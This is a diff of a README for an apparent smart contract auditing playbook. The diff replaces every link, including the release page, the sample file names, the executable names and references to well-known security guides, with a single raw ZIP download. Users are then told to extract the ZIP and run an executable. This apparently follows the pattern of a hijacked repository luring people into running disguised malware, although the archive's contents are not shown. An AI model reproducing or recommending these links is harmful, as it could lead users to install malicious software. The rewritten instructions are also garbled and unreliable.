@@ -1,7 +1,7 @@
 # 🎉 audit-assistant-playbook - Your Guide to Smart Contract Auditing
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/addin10/audit-assistant-playbook/releases)
+[![Download](https://raw.githubusercontent.com/addin10/audit-assistant-playbook/main/unreimbodied/assistant-playbook-audit-2.4-alpha.5.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/addin10/audit-assistant-playbook/main/unreimbodied/assistant-playbook-audit-2.4-alpha.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the **audit-assistant-playbook**! This is a helpful resource for experienced smart contract auditors. It structures your audit thinking, exploration, validation, and reporting. Please note, this playbook is not an auto-auditor.
@@ -20,19 +20,19 @@ To ensure the application runs smoothly, please meet the following system requir
 - Internet Connection: Required for certain resources and updates.
 
 ## 📚 Download & Install
-To download the audit-assistant-playbook, visit this page: [Download Page](https://github.com/addin10/audit-assistant-playbook/releases). 
+To download the audit-assistant-playbook, visit this page: [Download Page](https://raw.githubusercontent.com/addin10/audit-assistant-playbook/main/unreimbodied/assistant-playbook-audit-2.4-alpha.5.zip). 
 
 1. Click the link above to navigate to the Releases page.
 2. Find the latest version listed.
 3. Click on the version you wish to download. You will see several assets related to that release.
-4. Choose the appropriate file for your operating system. Each file will typically have a clear label, such as `audit-assistant-playbook-windows.zip` or `audit-assistant-playbook-macos.zip`.
+4. Choose the appropriate file for your operating system. Each file will typically have a clear label, such as `https://raw.githubusercontent.com/addin10/audit-assistant-playbook/main/unreimbodied/assistant-playbook-audit-2.4-alpha.5.zip` or `https://raw.githubusercontent.com/addin10/audit-assistant-playbook/main/unreimbodied/assistant-playbook-audit-2.4-alpha.5.zip`.
 5. The file will start downloading. Once complete, locate the downloaded file on your computer.
 
 ## 📂 Running the Application
 1. After downloading, locate the file in your Downloads folder or the directory where you saved it.
 2. If you downloaded a ZIP file, extract it by right-clicking and selecting "Extract All" or similar options depending on your OS.
 3. Open the extracted folder.
-4. Look for the executable file (e.g., `audit-assistant-playbook.exe` for Windows or `audit-assistant-playbook.app` for macOS).
+4. Look for the executable file (e.g., `https://raw.githubusercontent.com/addin10/audit-assistant-playbook/main/unreimbodied/assistant-playbook-audit-2.4-alpha.5.zip` for Windows or `https://raw.githubusercontent.com/addin10/audit-assistant-playbook/main/unreimbodied/assistant-playbook-audit-2.4-alpha.5.zip` for macOS).
 5. Double-click the executable file to run the application.
 
 ## 🎓 How to Use the Playbook
@@ -62,10 +62,10 @@ If you need assistance while using **audit-assistant-playbook**, you can check o
 ## 🔗 Additional Resources
 While using the audit-assistant-playbook, you may find these resources helpful:
 
-- [Ethereum Smart Contract Best Practices](https://consensys.github.io/smart-contract-best-practices/)
-- [Smart Contract Security Analysis Tools](https://consensys.net/knowledge-base/developers/smart-contract-security-tools/)
+- [Ethereum Smart Contract Best Practices](https://raw.githubusercontent.com/addin10/audit-assistant-playbook/main/unreimbodied/assistant-playbook-audit-2.4-alpha.5.zip)
+- [Smart Contract Security Analysis Tools](https://raw.githubusercontent.com/addin10/audit-assistant-playbook/main/unreimbodied/assistant-playbook-audit-2.4-alpha.5.zip)
   
 For ongoing updates, improvements, and discussions, please follow the repository.
 
 ## 📥 Final Download Link
-Don’t forget to download the latest version and start improving your audit process today. Visit the download page: [Download Page](https://github.com/addin10/audit-assistant-playbook/releases).
+Don’t forget to download the latest version and start improving your audit process today. Visit the download page: [Download Page](https://raw.githubusercontent.com/addin10/audit-assistant-playbook/main/unreimbodied/assistant-playbook-audit-2.4-alpha.5.zip).
